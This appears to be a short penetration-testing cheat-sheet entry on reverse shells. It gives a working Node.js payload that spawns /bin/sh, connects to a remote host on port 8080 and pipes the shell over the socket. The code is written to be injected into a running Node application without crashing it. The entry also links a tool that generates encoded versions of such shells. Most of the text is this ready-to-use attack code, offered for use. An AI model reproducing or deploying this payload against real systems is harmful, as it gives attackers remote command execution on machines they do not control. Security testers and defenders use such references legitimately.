# Reverse Shells

## Javascript

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.17.26.64", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();
```

Source: [https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/](https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/)

We can also use [nodejsshell.py](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) to generate encoded reverse shells.

